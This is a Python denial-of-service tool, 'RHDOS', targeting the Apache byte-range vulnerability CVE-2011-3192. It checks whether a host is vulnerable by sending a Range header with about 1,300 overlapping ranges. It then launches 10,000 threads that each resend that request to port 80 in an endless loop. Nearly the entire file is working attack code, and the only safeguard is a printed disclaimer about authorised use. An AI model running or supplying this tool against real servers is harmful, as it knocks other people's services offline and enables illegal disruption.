import requests
from colorama import Fore
import threading
import pyfiglet
import socket
import subprocess
import time

class RangeBomb:
    def __init__(self, host, uri) -> None:
        self.host = host
        self.uri = uri

    @staticmethod
    def banner():
        try:
            banner = pyfiglet.Figlet(font='cosmic')
            print(banner.renderText('RHDOS'))
        except Exception as e:
            print(f"Error while generating banner: {str(e)}")
        print('=========CVE-2011-3192==========')
        print('Made By                Pixel.Def')
        print('=========CVE-2011-3192==========')
        print('[+] Warning: This is vulnerability testing software based on Denial Of Service (DOS) on Servers, do not use without prior permission because this is illegal action. Use only in authorized environments that have full control, I am not responsible for misuse of the application.\n')
        time.sleep(2)

    def host_is_on(self):
        http_protocol = ['http://', 'https://']
        for protocol in http_protocol:
            try:
                res = requests.get(protocol+self.host)
                if res.status_code != 200:
                    return None
            except requests.ConnectionError:
                pass
            except requests.exceptions.ReadTimeout:
                print(f'\r{Fore.RED}[X] Target is Down!{Fore.RESET}', end='')
                pass

    def check_target(self):
        range_payload = '5'
        is_vulnerable = False

        for i in range(0, 1300):
            range_payload = f'{range_payload},5-{i}'
        
        headers = {'Host': self.host, 'Range': f'bytes=0-{range_payload}', 'Accept-Encoding': 'gzip', 'Connection': 'close'}
        http_protocol = ['http://', 'https://']

        for protocol in http_protocol:
            try:
                res = requests.get(protocol + self.host + self.uri, headers=headers, timeout=5)
                if res.status_code == 206:
                    is_vulnerable = True
            except requests.ConnectionError:
                pass
            except requests.exceptions.ReadTimeout:
                print(f'\r{Fore.RED}[X] Target is Down!{Fore.RESET}', end='')
                pass

        return is_vulnerable
    
    def Bomb(self):
        print(f'\r{Fore.GREEN}[+] Payload Sent!{Fore.RESET}', end='')
        range_payload = '5'
        for i in range(0, 1300):
            range_payload = f'{range_payload},5-{i}'

        header = f'GET {self.uri} HTTP/1.1\r\nHost: {self.host}\r\nRange: bytes=0-{range_payload}\r\nUser-Agent: RangeBomb/1.0\r\nAccept-Encoding: gzip\r\nConnection: close\r\n\r\n'
        header_encoded = header.encode('utf-8')
        while True:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((self.host, 80))
                sock.send(header_encoded)
            except socket.error:
                pass
            
            if self.host_is_on() is None:
                pass

def bomb_wrapper(host, uri):
    exploit = RangeBomb(host, uri)
    exploit.Bomb()

def main():
    try:
        subprocess.run(['cls', 'clear'], shell=True)
        RangeBomb.banner()
        host = str(input('[+] Host: '))
        target_uri = str(input('[+] Target_URI: '))

        check_target = RangeBomb(host, target_uri)
        if not check_target.check_target():
            print('[+] Target is not vulnerable!')
            exit(1)

        if host.startswith('http://') or host.startswith('https://'):
            print('[+] Http or Https not required')
            exit(1)

        threads = 100
        thread_list = []

        for _ in range(threads * 100):
            thread = threading.Thread(target=bomb_wrapper, args=(host, target_uri,))
            thread_list.append(thread)
            thread.start()

        for thread in thread_list:
            thread.join()
    except KeyboardInterrupt:
        print('\n[!] App Aborted!')
        exit(1)

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print('\n[!] App Aborted!')
        exit(1)
